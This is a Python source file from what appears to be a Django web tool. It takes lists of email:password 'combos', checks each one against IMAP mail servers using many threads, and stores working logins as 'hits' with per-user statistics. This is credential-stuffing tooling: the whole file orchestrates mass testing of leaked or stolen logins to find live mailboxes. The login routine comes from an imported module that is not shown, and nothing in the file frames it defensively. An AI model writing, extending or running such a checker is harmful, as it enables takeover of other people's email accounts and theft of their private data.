import sys
import threading

from .inc_attackimap import imapchecker
from queue import Queue
from time import sleep
from .inc_comboloader import comboloader

from imap.models import Combo, IMAPCheckResult, Statistics

targets_total = int(0)
targets_left = int(0)
hits = int(0)
fails = int(0)

checker_queue = Queue()


def checker_thread(default_timeout, user_id):
    '''
    Function for a single thread which performs the main checking process.

    :param float default_timeout: timeout for server connection
    :return: None
    '''
    # set variables:
    global targets_left
    global hits
    global fails
    # start thread for IMAP checker:
    while True:
        target = str(checker_queue.get())
        target_email, target_password = target.split(':')
        combo = Combo.objects.filter(email=target_email, password=target_password, user_id=user_id)[0]
        result = False
        try:
            result = imapchecker(
                float(default_timeout),
                str(f'{target}')
            )
        except:
            pass
        # update stats:
        if result:
            IMAPCheckResult.objects.create(combo=combo, user_id=user_id, status='hit')
            hits += 1
        else:
            IMAPCheckResult.objects.create(combo=combo, user_id=user_id, status='fail')
            fails += 1
        targets_left -= 1
        checker_queue.task_done()


def checker(default_threads, default_timeout, file_content, user_id):
    '''
    Function to control the import of combos, to start threads etc.

    :param int default_threads: amount of threads to use
    :param float default_timeout: timeout for server-connections
    :param str file_content: string with combos to import
    :return: True (no errors occurred), False (errors occurred)
    '''
    global targets_total
    global targets_left

    try:
        combos = comboloader(file_content, user_id)
    except Exception as e:
        print(f"Error loading combos: {e}")
        combos = []

    targets_total = len(combos)
    targets_left = targets_total

    if targets_total > 0:
        for _ in range(default_threads):
            single_thread = threading.Thread(
                target=checker_thread,
                args=(default_timeout, user_id),
                daemon=True
            )
            single_thread.start()

        for target in combos:
            checker_queue.put(target)

        checker_queue.join()
        sleep(3.0)

    stats, created = Statistics.objects.get_or_create(user_id=user_id)
    stats.total_combos += targets_total
    stats.total_hits += hits
    stats.total_fails += fails
    stats.save()

    return True
